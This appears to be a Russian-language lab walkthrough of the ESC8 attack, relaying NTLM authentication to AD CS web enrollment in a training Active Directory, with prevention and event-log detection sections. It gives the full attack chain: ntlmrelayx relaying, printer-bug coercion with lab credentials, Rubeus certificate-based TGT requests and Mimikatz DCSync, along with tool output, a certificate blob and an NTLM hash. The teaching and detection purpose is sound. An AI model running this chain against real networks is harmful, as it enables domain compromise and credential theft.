@@ -1,0 +1,270 @@
+=====================================================================
+* Руководство *
+***************
+
+Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.
+
+Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
+Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
+Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.
+
+Окружение состоит из следующих машин и соответствующих им IP-адресов:
+
+	-	DC1			172.16.18.3
+	-	DC2			172.16.18.4
+	-	Server01	172.16.18.10
+	-	PKI			172.16.18.15
+	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
+	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)
+
+Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)
+
+	i)			Поключаемся к хосту жертвы через RDP
+	ii)			Пуск -> Windows Accessories -> Remote Desktop
+	iii)		Computer	=	DC1 ip address
+				User Name	=	Имя пользователя (к примеру htb-student)
+	iv)			Пароль введем позже (будет предоставлен запрос)
+	v)			Соглашаемся на устанвку соединения
+
+*** Если для атаки необходимо использовать бот-хост, через который будет установленно RDP соединение с хостом (или серверами домена), то рекомендуется сначала подключиться по SSH к хосту Kali, включив динамическую переадресацию портов
+	Это повысит производительность RDP соединения
+	А затем подключиться по RDP  с вашего атакующего хоста с использованием proxychains
+	Детальную инструкцию можно найти тут	-	Dynamic Port Forwarding with SSH and SOCKS Tunneling (https://academy.hackthebox.com/module/158/section/1426)
+	Если доступа к статье нет, то ищите у меня разделе PenTest
+
+=====================================================================
+* Легенда *
+***********
+
+После того, как SpectreOps выпустила исследовательскую работу Certified Pre-Owned (https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), службы сертификатов Active Directory (AD CS) стали одним из самых любимых векторов атак для агентов угроз по многим причинам, включая:
+
+	1)	Использование сертификатов для аутентификации имеет больше преимуществ, чем обычные учетные данные имени пользователя/пароля.
+
+	2)	Большинство серверов PKI были неправильно настроены/уязвимы по крайней мере для одной из восьми атак, обнаруженных SpectreOps (позже было обнаружено гораздо больше вариантов проникновения).
+
+Использование сертификатов и компрометация центра сертификации (CA) имеет множество преимуществ:
+
+	-	Сертификаты пользователей и машин действительны в течение 1+ года.
+
+	-	Сброс пароля пользователя не делает сертификат недействительным.
+		С сертификатами неважно, сколько раз пользователь меняет свой пароль
+		Сертификат все равно будет действителен (если не истек срок его действия или он не был отозван).
+
+	-	Неправильно настроенные шаблоны позволяют получить сертификат для любого пользователя.
+
+	-	Компрометация закрытого ключа CA приводит к подделке золотых сертификатов (Golden Certificates)
+
+Эти преимущества делают сертификаты предпочтительным методом для долгосрочного сохранения.
+В данной демонстрации мы рассмотрим ESC8. 
+
+	+++++++++++++++++++++++++++++++++++++++++++++
+	+ ESC8 - NTLM Relay to AD CS HTTP Endpoints +
+	+++++++++++++++++++++++++++++++++++++++++++++
+	
+	ESC8 (NTLM Relay to AD CS HTTP Endpoints) - это т.н. "ретрансляция в ADCS для получения сертификата"
+
+	Как известно, AD CS поддерживает несколько методов регистрации на основе HTTP с помощью дополнительных ролей сервера AD CS, которые могут устанавливать администраторы.
+	Все эти интерфейсы регистрации сертификатов на основе HTTP являются уязвимыми атаками ретрансляции NTLM.
+	Используя ретрансляцию NTLM, злоумышленник на скомпрометированной машине может выдать себя за любую входящую учетную запись AD, аутентифицируемую NTLM.
+	Выдавая себя за учетную запись жертвы, злоумышленник может получить доступ к этим веб-интерфейсам и запросить сертификат аутентификации клиента на основе шаблонов сертификатов пользователя или компьютера.
+
+	Поскольку на конечных точках не включена защита ретрансляции NTLM, то ретрансляция NTLM на эти конечные точки регистрации сертификатов на основе HTTP возможна в соедующих случаях:
+	
+		-	Интерфейс веб-регистрации (старое приложение ASP, доступное по адресу http://<caserver>/certsrv/) по умолчанию поддерживает только HTTP, что не может защитить от атак ретрансляции NTLM.
+			Кроме того, он явно разрешает аутентификацию NTLM только через свой заголовок HTTP Authorization, поэтому более безопасные протоколы, такие как Kerberos, непригодны для использования.
+		
+		-	Хотя служба регистрации сертификатов (CES), веб-служба политики регистрации сертификатов (CEP) и служба регистрации сетевых устройств (NDES) поддерживают согласование аутентификации по умолчанию через свой заголовок HTTP Authorization.
+			А также согласование аутентификации поддерживает Kerberos и NTLM
+			Но к сожалению, злоумышленник используя все это тем не менее может договориться об аутентификации NTLM во время атак ретрансляции.
+			
+			Эти веб-службы по крайней мере включают HTTPS по умолчанию, но, к сожалению, сам по себе HTTPS не защищает от атак ретрансляции NTLM.
+			Только когда HTTPS связан с привязкой канала, службы HTTPS могут быть защищены от атак NTLM-ретрансляции.
+			К сожалению, AD CS не включает расширенную защиту для аутентификации в IIS, которая необходима для включения привязки канала.
+	
+	Ретрансляция NTLM на веб-интерфейсы регистрации AD CS дает злоумышленникам множество преимуществ.
+	
+	Тем не менее, существует общая проблема, с которой сталкиваются злоумышленники при выполнении атак с ретрансляцией NTLM
+	Она заключается в том, что когда происходит входящая аутентификация и злоумышленник ее ретранслирует, есть только короткий промежуток времени, чтобы злоупотребить ею.
+	Привилегированная учетная запись может пройти аутентификацию только один раз на машине злоумышленника.
+	Инструменты злоумышленника могут попытаться сохранить сеанс NTLM активным как можно дольше, но часто сеанс можно использовать только в течение короткого периода времени.
+	Кроме того, сеанс аутентификации ограничен — злоумышленник не может взаимодействовать со службами, которые обеспечивают подпись NTLM.
+
+	Однако злоумышленник может обойти эти ограничения, перейдя на веб-интерфейсы AD CS.
+	Используя NTLM-ретранслятор для доступа к веб-интерфейсам AD CS, злоумышленник запрашивает сертификат аутентификации клиента в качестве учетной записи жертвы.
+	Затем он может пройти аутентификацию через Kerberos или Schannel или получить NTLM-хэш учетной записи жертвы с помощью PKINIT.
+	Это обеспечивает злоумышленнику доступ к учетной записи жертвы на длительный период времени (т. е. независимо от срока действия сертификата)
+	И злоумышленник может свободно проходить аутентификацию в любой службе с использованием нескольких протоколов аутентификации без помех со стороны подписи NTLM.
+
+	Другим ограничением атак NTLM-ретрансляции является то, что они требуют, чтобы учетная запись жертвы прошла аутентификацию на контролируемой злоумышленником машине.
+	Злоумышленник может терпеливо ждать, пока это произойдет в рамках обычных операций в сети, или злоумышленник может заставить учетную запись пройти аутентификацию на скомпрометированной машине.
+	Принудительная аутентификация возможна многими способами.
+	Один из таких приемов - «ошибку принтера» (https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory#slide=41)
+	Она работает путем принуждения учетных записей машин к аутентификации на хосте злоумышленника с использованием метода RPC MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) (реализованного в инструменте SpoolSample, а затем в инструменте Dementor с использованием Impacket).
+	
+	SpoolSample	-	https://github.com/leechristensen/SpoolSample/
+	Dementor	-	https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py
+	
+	Используя «ошибку принтера», злоумышленник может использовать ретранслятор NTLM, чтобы выдать себя за учетную запись машины и запросить сертификат аутентификации клиента как учетную запись жертвы.
+	Если учетная запись жертвы может выполнять привилегированные действия, такие как репликация домена (например, контроллеры домена или серверы Exchange), злоумышленник может использовать этот сертификат для компрометации домена.
+	Злоумышленник также может войти в систему как учетная запись жертвы и использовать S4U2Self, для доступа к хостовой ОС жертвы или использовать PKINIT, чтобы получить хэш NT учетной записи машины, а затем подделать билет службы Kerberos (также известный как атака «серебряный билет»).
+
+	Подводя итог, если в среде установлен AD CS, а также уязвимая конечная точка веб-регистрации и опубликован по крайней мере один шаблон сертификата, который позволяет регистрировать компьютер домена и аутентифицировать клиента (например, шаблон Machine по умолчанию), то злоумышленник может скомпрометировать ЛЮБОЙ компьютер с запущенной службой спулера!
+	К счастью, новые операционные системы исправили «функцию» принудительной аутентификации MS-RPRN.
+	Однако почти в каждой среде, которую мы исследуем, все еще работают машины Server 2016, которые все еще уязвимы для этого.
+	
+	Существуют и другие способы принудительного принуждения учетных записей к аутентификации для злоумышленника, которые также могут помочь в локальном повышении привилегий или удаленном выполнении кода.
+	
+	В ESC1 мы использовали PrinterBug и Coercer, чтобы заставить (или заставить) компьютеры подключиться к любому другому компьютеру.
+	В этом сценарии мы воспользуемся PrinterBug, и с полученным обратным соединением мы ретранслируем в ADCS для получения сертификата для машины, которую мы принудительно подключили.
+
+=====================================================================
+* Схема атаки *
+***************
+
+!!!	Небольшое отступление !!!
+
+В данном задание (да и желательно во всех предыдущих), когда мы подключаемся от Linux машины к Windows машине через xfreerdp использовать следующую команду
+Так как данная команда создает общиq диск для обмена файлами
+
+	:$ xfreerdp /u:<domain_name\\user_name> /p:<password> /v:<target_ip> /drive:Linuxshare,<path_to_shared_folder_on_linux> /dynamic-resolution
+
+Теперь в Windows в "Этот компьютер" появится диск LinuxFiles, где можно забирать файлы.
+
+Также, не забываем про SSH/RDP тунелирование, если атака происходит через бот-хост
+
+Начнем с настройки NTLMRelayx для пересылки входящих соединений на конечную точку HTTP нашего центра сертификации.
+В рамках этой конфигурации мы укажем, что хотим получить сертификат для контроллера домена (шаблон по умолчанию в AD, который контроллеры домена используют для аутентификации клиента).
+Параметр --adcs заставляет NTLMRelayx анализировать и отображать сертификат, если он получен:
+*** Так как в данном примере мы используем бот-хост, то и атаки будут происходить с его терминала
+
+	<bot_host_username>@<bot_hostname>$ impacket-ntlmrelayx -t http://<PKI_server_ip_address>/certsrv/default.asp --template DomainController -smb2support --adcs
+
+		Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+		[*] Protocol Client SMTP loaded..
+		[*] Protocol Client LDAPS loaded..
+		[*] Protocol Client LDAP loaded..
+		[*] Protocol Client DCSYNC loaded..
+		[*] Protocol Client IMAPS loaded..
+		[*] Protocol Client IMAP loaded..
+		[*] Protocol Client RPC loaded..
+		[*] Protocol Client HTTP loaded..
+		[*] Protocol Client HTTPS loaded..
+		[*] Protocol Client MSSQL loaded..
+		[*] Protocol Client SMB loaded..
+		[*] Running in relay mode to single host
+		[*] Setting up SMB Server
+		[*] Setting up HTTP Server on port 80
+		[*] Setting up WCF Server
+		[*] Setting up RAW Server on port 6666
+
+		[*] Servers started, waiting for connections
+
+Теперь нам нужно заставить контроллер домена подключиться к нам.
+Мы воспользуемся ошибкой диспетчера очереди печати и принудительно установим обратное подключение к нам (как мы уже делали в лабораторной работе ESC1).
+В этом случае мы заставляем DC2 подключиться к машине Kali, пока NTLMRelayx слушает в другом терминале:
+***	Для этого (если необходимо) нам надо будет создать еще одно соединение с бот-хостом
+
+	<bot_host_username>@<bot_hostname>$ python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
+
+		[*] connecting to 172.16.18.4
+		[*] bound to spoolss
+		[*] getting context handle...
+		[*] sending RFFPCNEX...
+		[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
+		[*] done!
+
+Если мы вернемся к терминалу NTLMRelayx, то увидим, что входящий запрос от DC2$ был ретранслирован и сертификат успешно получен:
+
+	[*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.18.4, attacking target http://172.16.18.15
+	[*] HTTP server returned error code 200, treating as a successful login
+	[*] Authenticating against http://172.16.18.15 as EAGLE/DC2$ SUCCEED
+	[*] SMBD-Thread-7 (process_request_thread): Connection from 172.16.18.4 controlled, but there are no more targets left!
+	[*] SMBD-Thread-8 (process_request_thread): Connection from 172.16.18.4 controlled, but there are no more targets left!
+	[*] Generating CSR...
+	[*] CSR generated!
+	[*] Getting certificate...
+	[*] GOT CERTIFICATE! ID 57
+	[*] Base64 certificate of user DC2$: 
+	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
+
+Мы скопируем полученный сертификат в кодировке base64, перейдем на машину Windows  (той, с которой у нас установлено тунельное SSH/RDPсоединение) и воспользуемся Rubeus для аутентификации с помощью сертификата (на этот раз сертификат имеет правильный формат) и получим TGT:
+
+	PS C:\...\...\...> .\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>
+
+Теперь мы получили TGT для контроллера домена DC2.
+Поэтому мы становимся DC2.
+Об этом нам говорит следующая информация из отчета Rubeus:
+
+	...SNIP...
+	[+] TGT request successful!
+	...SNIP...
+	doIF7DCCBe...SNIP...bG9jYWw=
+	[+] Ticket successfully imported!
+	...SNIP...
+	UserName                 :  DC2$
+
+Будучи контроллером домена, мы теперь можем запустить DCSync с помощью Mimikatz:
+
+	PS C:\...\...\...> .\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
+
+Успешным использованием Mimikatz будет отображение NTLM хэша учетки Administrator
+
+	Credentials:
+  	Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
+
+=====================================================================
+* Предотвращение/защита *
+*************************
+
+Вышеуказанная атака стала возможной, потому что:
+
+	-	Нам удалось успешно принудить DC2
+	-	Веб-регистрация ADCS не требует HTTPS (в противном случае ретрансляция не будет выполнена, и мы не будем запрашивать сертификат)
+
+Поскольку существует множество различных методов эскалации, связанных с PKI, настоятельно рекомендуется регулярно сканировать среду с помощью Certify или других аналогичных инструментов для выявления потенциальных проблем.
+
+=====================================================================
+* Обнаружение *
+***************
+
+Эта атака предоставляет несколько методов обнаружения.
+Если мы начнем с той части, где сертификат запрашивается NTLMRelayx, то увидим, что CA пометил как запрос, так и издателя сертификата в событиях с идентификаторами 4886 и 4887 соответственно:
+
+	-	4886 (Certificate Services received a certificate request)
+			Requester ID			:	##
+			Requester				:	domain_name\xxxx
+			CertificateTemplate		:	DomainController
+
+	-	4887 (Certificate Services approved a certificate request and issued a certificate
+			Requester ID			:	##
+			Requester				:	domain_name\xxxx
+			CertificateTemplate		:	DomainController
+
+Также бросается в глаза то, что имя шаблона упоминается как часть запроса
+Однако, если его запрашивает сам контроллер домена (не ретрансляция), то его нет.
+Тем не менее в среде могут быть некоторые исключения
+Таким образом, лучше всего проверить, можно ли его использовать в качестве индикатора атак на ADCS, принуждения/ретрансляции.
+
+Впоследствии, в атаке, мы использовали полученный сертификат, чтобы получить Kerberos TGT, что привело к событию с идентификатором 4768
+
+	-	4768 (A Kerberos authentication ticket (TGT) was requested)
+			Account Name	:	xxxx
+			User ID			:	domain_name\xxxx
+			Client address	:	::ffff:###.###.###.### (login_name with certificate from another IP)
+
+Выделяется, что XXXX пытается войти с сертификатом, а IP-адрес не принадлежит DC.
+
+Наконец, когда мы используем Mimikatz для выполнения DCSync, мы увидим идентификатор события 4624, который указывает на то, что XXXX успешно аутентифицировался с другого IP-адреса, а не со своего собственного:
+
+	-	4624 (An account was successfully logged on)
+			Security ID				:	doamin_name\xxxx
+			Account Name			:	xxxx
+			Source Network address	:	###.###.###.### (login from another IP)
+
+=====================================================================
+* Ловушка/Honeypot *
+********************
+
+К сожалению вариантов с ловушкой для данного вида атаки представлено не было
+		
